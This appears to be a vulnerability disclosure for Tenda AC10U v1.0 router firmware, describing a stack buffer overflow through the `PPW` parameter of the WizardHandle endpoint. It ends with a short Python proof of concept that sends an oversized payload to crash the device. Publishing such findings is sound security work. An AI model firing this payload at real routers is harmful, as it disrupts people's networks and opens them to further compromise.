## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3170.html

## Affected version

AC10U v1.0 Firmware  V15.03.06.48、AC10U v1.0 Firmware  V15.03.06.49

## Vulnerability details

The Tenda AC10U v1.0 Firmware V15.03.06.48, AC10U v1.0 Firmware  V15.03.06.49 firmware has a stack overflow vulnerability located in the `fromWizardHandle` function. This function accepts the `WANT`and `WANS` parameter from a POST request. Within `case 2`, this function accepts the `PPW` parameter from a POST request, which is assigned to `decodePwd(pppoepwd, decode_pwd);`. However, since the user has control over the input of `PPW`, the function `decodePwd()` leads to a buffer overflow. The user-supplied `PPW` can exceed the capacity of the `decode_pwd` array, thus triggering this security vulnerability.

![image-20240409144436622](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409144436622.png)

![image-20240409144543183](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409144543183.png)

![image-20240409144601905](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409144601905.png)

![image-20240409144618132](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409144618132.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/WizardHandle"
payload = b"a"*1000

data = {"WANS":"0","WANT":"2","PPW": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240409102339559](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409102339559.png)